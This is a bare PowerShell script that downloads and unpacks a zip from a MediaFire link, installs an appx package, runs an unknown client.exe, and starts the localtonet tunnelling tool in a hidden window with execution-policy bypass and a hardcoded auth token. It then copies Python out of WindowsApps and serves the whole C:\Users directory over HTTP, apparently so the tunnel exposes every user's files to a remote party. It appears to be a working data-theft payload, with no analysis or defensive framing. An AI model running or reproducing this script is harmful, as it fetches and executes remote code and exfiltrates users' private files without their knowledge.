cd ..
cd ..
cd ..
cd ..
cd ..
cd ..
cd ..
cd ..
cd ..
cd ..
Invoke-WebRequest -Uri http://download1525.mediafire.com/4xvfh9ejstmg/9jst20oi7ryqzp1/toolsv2.zip -OutFile (Join-Path Documents toolsv2.zip)
Add-Type -AssemblyName System.IO.Compression.FileSystem
 function Unzip
 {
     param([string]$zipfile, [string]$outpath)

     [System.IO.Compression.ZipFile]::ExtractToDirectory($zipfile, $outpath)
}

Unzip "Documents\toolsv2.zip" "Documents"
add-appxpackage -path "Documents\toolsv2\python310.appx"
cd Documents
cd toolsv2
./client.exe
robocopy 'results' 'C:\\Users\'
start powershell {-exec bypass -WindowStyle Hidden IEX(./localtonet.exe authtoken gzPhq7vUOD3VfGLkYt29iEdj01yXcNmZI)} 
cd 'C:\'
mkdir PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0
robocopy 'C:\Program Files\WindowsApps\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0' 'C:\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0' /E
cd "C:\PythonSoftwareFoundation.Python.3.10_3.10.2032.0_x64__qbz5n2kfra8p0"
./python.exe -m http.server 4040 --bind 127.0.0.1 --directory "C:\\Users\"

